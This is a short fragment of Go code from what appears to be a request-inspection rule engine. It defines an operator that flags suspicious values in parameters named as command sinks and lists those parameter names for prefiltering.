	v, ok := ctx.SiblingValue(ctx.Key)
	if !ok || len(v) == 0 {
		return rules.Match{}, false
	}
	if o.d.AnalyzeIn(v, true).Score < o.threshold {
		return rules.Match{}, false
	}
	// The span belongs to the name, which is the value this operator was given;
	// the finding names the parameter and the message says what was in it.
	return rules.WholeValue(value), true
}

// Literals are the sink parameter names, because the name is what this operator
// is nominated on. A request with no parameter called any of these cannot
// match, which is what keeps it off ordinary traffic entirely.
func (o *sinkOperator) Literals() ([]string, bool) {
	out := make([]string, 0, len(commandSinkParams))
	for name := range commandSinkParams {
		out = append(out, name)
	}
	sort.Strings(out)
	return out, true
}

func (o *sinkOperator) Cost() types.Fuel { return types.CostLiteralMatch * 6 }
